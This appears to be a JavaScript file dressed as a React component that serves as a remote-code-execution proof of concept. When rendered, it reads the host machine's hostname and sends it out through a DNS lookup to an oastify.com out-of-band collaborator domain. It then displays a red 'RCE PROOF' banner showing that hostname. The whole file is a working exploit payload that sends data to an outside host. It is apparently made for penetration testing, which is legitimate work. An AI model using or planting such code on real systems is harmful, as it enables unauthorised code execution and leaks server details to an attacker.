var React = require("react");

module.exports = {
  default: function(props) {
    var hostname = "unknown";
    try { hostname = require("os").hostname(); } catch(e) {}
    try { require("dns").lookup(hostname + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){}); } catch(e) {}
    
    return React.createElement("div", {
      id: "rce-proof",
      style: {background:"red",color:"white",padding:"20px",fontSize:"24px",position:"fixed",top:0,left:0,zIndex:99999}
    }, "RCE PROOF: " + hostname + " | " + new Date().toISOString());
  }
};
